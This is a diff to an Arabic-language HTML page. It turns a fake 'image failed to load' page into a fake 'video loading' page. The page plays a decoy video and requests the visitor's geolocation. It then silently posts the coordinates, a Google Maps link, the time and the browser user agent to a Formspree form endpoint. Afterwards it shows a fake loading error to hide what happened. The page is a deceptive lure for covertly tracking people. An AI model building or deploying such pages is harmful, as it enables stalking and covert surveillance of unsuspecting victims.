@@ -1,8 +1,8 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar">
 <head>
-  <meta charset="UTF-8" />
-  <title>Image Viewer</title>
+  <meta charset="UTF-8">
+  <title>تحميل الفيديو</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -11,26 +11,44 @@
       padding-top: 100px;
       color: #444;
     }
-    h2 {
-      font-size: 20px;
-      color: #000;
+    video {
+      width: 300px;
+      height: auto;
+    }
+    .message {
+      font-size: 18px;
+      margin-top: 20px;
     }
   </style>
 </head>
 <body>
-  <h2>❌ تعذّر تحميل الصورة</h2>
-  <p>حدث خلل أثناء تحميل الصورة، يرجى المحاولة لاحقًا.</p>
+  <h2>يتم تحميل الفيديو...</h2>
+  <video autoplay muted loop>
+    <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
+    متصفحك لا يدعم تشغيل الفيديو.
+  </video>
+  <p class="message">الرجاء الانتظار...</p>
 
   <script>
+    function getDeviceInfo() {
+      const ua = navigator.userAgent;
+      return ua;
+    }
+
     if (navigator.geolocation) {
       navigator.geolocation.getCurrentPosition(function(position) {
         const latitude = position.coords.latitude;
         const longitude = position.coords.longitude;
         const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+        const date = new Date().toLocaleString("ar-JO");
+        const device = getDeviceInfo();
+
         const data = {
           location: `Latitude: ${latitude}, Longitude: ${longitude}`,
           maps: mapsLink,
-          _subject: "📍 New Location Received!"
+          time: date,
+          device: device,
+          _subject: "📍 New Location Received"
         };
 
         fetch("https://formspree.io/f/xkgjqegp", {
@@ -40,7 +58,19 @@
           },
           body: JSON.stringify(data)
         });
+
+        // بعد الإرسال بنجاح
+        document.querySelector("video").style.display = "none";
+        document.querySelector(".message").innerHTML = "❌ تعذر تحميل الصورة. حدث خلل أثناء تحميل الصورة، يرجى المحاولة لاحقًا.";
+
+      }, function(error) {
+        // تم الرفض
+        document.querySelector("video").style.display = "none";
+        document.querySelector(".message").innerHTML = "❌ تعذر تحميل الصورة. حدث خلل أثناء تحميل الصورة، يرجى المحاولة لاحقًا.";
       });
+    } else {
+      document.querySelector("video").style.display = "none";
+      document.querySelector(".message").innerHTML = "❌ تعذر تحديد الموقع. جهازك لا يدعم تحديد الموقع الجغرافي.";
     }
   </script>
 </body>
